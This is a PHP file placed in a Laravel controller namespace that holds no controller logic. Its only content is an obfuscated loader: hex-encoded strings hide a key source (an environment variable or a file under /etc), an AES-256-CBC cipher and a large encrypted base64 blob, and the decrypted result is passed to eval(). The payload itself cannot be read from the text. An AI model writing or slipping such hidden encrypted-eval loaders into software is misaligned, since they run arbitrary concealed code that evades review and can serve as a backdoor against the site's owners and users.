<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('giJwzxHW0vZbnqYelsILFg==');

$c=base64_decode(

'qPXgvenxgZ92ZwbaGaruPWzaezWetWwX09e9JlM3uZW9PAJTRDsuOoVvDpaHvvZdr0AFFs2LTrAA' .
'Y6GlhWOxhpC9aJGZetjKhJGsosaz2U3qlLfUJI6mk3HyLzqd2GpaYmbCi7P740XDKteFj37RvMFG' .
'lRPRG7nKSUHV7gBKMK8omdsMZnRXkIVZL9ZaUljkf2eNDfZd4rYw9NAaM0s1wFzhqpjY2KNg3SP4' .
'dkt8BIkfi5+p8uCqsQdqSOZirWRAGpm+8J2z5mlylebP5pPm+4/40Wt1SGSLxlgPeOZuvZgTocb3' .
'Dc6qTe0Hd+fHgg+vmFnjBiAeTjyUn3nWXLEZ6C4nVsItBNMeNWbW2ItgvRxMCE5tgkMbYyQ2EIE4' .
'cUyAOKKKIMdBEPLbF7NC4uLYEEFy9caEJSY78qsnREKFlCR9+8Qd0hNoAA6dLll9MXaYlME/ELnT' .
'GP2SsRO2w54oVBrG00gjo8Tr7lL+bDnjGiMN4c3T1DNbz6uS9NZiJHa12LL6rCNWOrd7LYwKRoa5' .
'ZD0nfQKXyv3mENdN0hBWqXzjrvzb+maC3TevylNYlMeK+ZUD+AiOMnfZEgtWL2ZkMgeA1qodhm2d' .
'Hbt+0VfzgR5md2obYUL63fdkamRP/gQGS4NtBe8E6wWZcrVYKknqHPT8kg3JfrFDvUA9ZSsNxTV1' .
'Zpx+Qwre2UHOG/nClfjuqX9KDkCf5JwUffsgQG6FMCF0g3zMMTENaeJOYGsZ+Kw/liFfnifR7HLs' .
'vyEKUxZuhpxN1eFIAfw+0cVkTa8CFhL0iMAhv7NjsH2Ed1yxljoL0VuwT8Hm6DkOP8SVmPjyOEOr' .
'E2kKTZsbRFtjDt6HldPMdgaVolutDEJzjrzB9YYVEFVZA6LRifANeeZ7cEu6QuBZKijZigiSgSA5' .
'tYg2mfHW+gz9mNex9KcVKGCQfEGoGw9GOdDgih6Z3d6X/weQKdGC1pYjQQKZKCwDjC/RfDkMGzR6' .
'8EAFKGD6poT96Kmz1sJOwEDb9Ar0ngNlGlqz6TBmDyDkISYMQHgpmLlZDAg7z9RH+KA17udw2gZG' .
'KgvOgAl5w5SKu0IrPSFZZCFLhBjvuqjIiNFKICzN240sNLZhEzd9RFVkOt8SVla8gkOhr8HoS5z9' .
'Bjt3NvZZW4Oe6tBIDZHIetIYxnPCc9H6uNC6mSdMNr4H6dgFlkSq+O4lz/+zqBHKzTg4dJqesDr/' .
'0XBKLDX0q/9WWzHk/7e95k8/FNoyLD5EcnzBGkMO5kHjNG2KyQ0K5se9EZlqMDau1DgDEK0uJKe5' .
'fPYTOPkNA7p5GvLBmE2YEv0R8boy5Jw3oTacJl/9NTDv/cwBUYJM9ytU2Dmqjccbme/gIlgY7Gqt' .
'A7r+tGJrJak+xRdai1OZ5ePr0YXeUWJagxJRVbbZ2US4EI++2Ar5MkND/n8F5cL3UX/Kwr4vFAC3' .
'nc/NoFCDtiGgiKT3T3k91YMVEOohk3LTwx+cL4EmVokRSh7kknSAUa16TCpYi6LiALYp0U8hBZvR' .
'QB68KnnAzqzAiXREgWwT144chueIQ9k+iQWiZrfLLOB/94HlfEn7KFf1i74O7v6zpcd+XNFd8nOT' .
'hsx+uAAJipvTu6y736skUFdWUt7NkJtIwLiXyBfCRibEUn524vUWm3qSIlS8Ak7x6ZDalYZ+9bWv' .
'd5tnETnlnGbQgXALe0h02l1bX/51NbmtHtWdvy6Sjq6IHhynLf4o1QShuAgseTdVe8RlrTZBrwEx' .
'l2pp3uRj2Ose8bkB8bG5iq9dsZl3Jc0ARpXTjScYHkWSDc6hl9LQ5v6GlrTxNBp2R+3bbjr0i6mo' .
'RyRubQpYCiQheu8ampuLy8TvHatDFmtieINNOIrMTXESkI/H8ewo+SXN0AcxXPK59FLvPpvWpUaA' .
'KWqcmZl/GZlh3HUhhIqI3cSag8KhPESpTB1wJBXQVkPbr1JfzDXT/Oicogv7cPIlJkMeaEStoCda' .
'AkeWlxnfDdT4fl/TypgY/HZKfcg+OgAWdzXhT21oZ8Beh3ohBuNYvLJ5EYHn4Gz9uKhgfDK6uPnH' .
'zs7ksIvZQMiW9CYKwsc5riUIZpoW4UBY9a8hoAVRrhih1e6wnV+2IA8bY4EOJzCJLJJrPLaUMwgc' .
'bXg4oQrsoGNdKMhDqTGxCXnBuDFKpGSWQzBRi2QBBLeGYSNZHzJkCKzb47uGH9jga5obfUc9KfP5' .
'3acBEXgyIgc3FKWmT9FSQArsHfCiaqY+mxJCORdj5ZDSyRpw/uIEuqqWU6VqYp+6SlMadIisdlaI' .
'L6N8zgbfMIFM9tVho7eP/mPWeO1qHx8MEmIkcKs+0qnjVrIoHEGsPwPUGmPs9GYO1aWZGEeFw4aN' .
'ayaRG7PSsG6YwLOJ7eB5kHyZd/iBzoBhB4UxWp4kVlb3Pgp8tqKiQtEjovRcBMQGu3MXCHjsl1wT' .
'Xvg3SLYBEOLKThJ+FgCe30Hh/c5KrPU7ll+aQPBfW9/RS1O1/0xzFc/K6nR0Yfkl6s/pTy5kk2MX' .
'z7HhNt+9dA=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

